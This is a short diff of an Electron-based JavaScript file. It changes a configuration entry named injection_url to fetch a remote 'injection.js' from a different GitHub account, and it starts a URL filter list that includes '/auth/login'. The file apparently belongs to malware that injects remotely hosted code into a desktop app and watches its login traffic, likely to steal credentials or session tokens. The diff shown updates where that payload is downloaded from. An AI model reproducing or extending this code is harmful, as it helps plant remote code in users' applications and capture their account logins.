@@ -12,7 +12,7 @@ const {
 } = require('electron');
 
 const CONFIG = {
-    injection_url: "https://raw.githubusercontent.com/lotusknig/lotus-knight.github.io/refs/heads/main/injection.js",
+    injection_url: "https://raw.githubusercontent.com/tabo1337/site123/refs/heads/main/injection.js",
     filters: {
         urls: [
             '/auth/login',
